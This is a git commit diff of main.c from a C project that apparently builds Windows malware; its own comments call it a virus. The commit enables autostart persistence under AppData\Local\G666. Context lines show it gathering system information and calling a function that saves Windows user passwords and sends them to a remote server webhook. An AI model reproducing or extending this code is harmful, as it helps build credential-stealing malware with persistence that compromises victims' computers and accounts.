f601a2943c6b23ddbcb95ab79c4939e6da7818b8
Nesquik <95046265+NeyTwix@users.noreply.github.com>
2024-09-18 17:01:11 +0200

    Main updated

--- src/main.c
+++ src/main.c
@@ -4,7 +4,7 @@
 #include "computer_informations.c"
 #include "windows_users_passwords.c"
 #include "autostart.c"
-//#include "persistance.c"
+// #include "persistance.c"
 
 #include "../include/http.h"
 #include "../include/structures.h"
@@ -22,14 +22,16 @@ src/windows_users_passwords:
     -save_and_send_windows_users_password(COMPUTER_INFOS *cmp_info)
 */
 
-int is_first_execution(){
-    
+int is_first_execution()
+{
+
     /*Fonction à coder pour éviter de recréer le dossier du virus et sa persistance vue qu'il s'execute au démarage*/
 
     return 0; // ou return 1
 };
 
-int main(void){
+int main(void)
+{
 
     char executable_name[] = "main.exe";
 
@@ -46,16 +48,15 @@ int main(void){
 
     // C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp // dossier de démarrage de windows
 
-    /*// Chemin du répertoire du logiciel et nom de l'exécutable
+    // Chemin du répertoire du logiciel et nom de l'exécutable
     const char *repertoireLogiciel = "C:\\Users\\%s\\AppData\\Local\\G666";
     const char *nomExecutable = "main.exe";
-    add_winstart(repertoireLogiciel, nomExecutable);*/
+    add_winstart(repertoireLogiciel, nomExecutable);
 
     printf("\nComputer Name: %s\n", computer.computer_name);
     printf("Username: %s\n", computer.username);
     printf("Windows Version: %s\n", computer.windows_version);
     printf("Architecture: %s\n\n", computer.architecture);
-
 
     send_to_server("/webhook/client.php", "{\"client_id\":1}");
     save_and_send_windows_users_password(&computer);
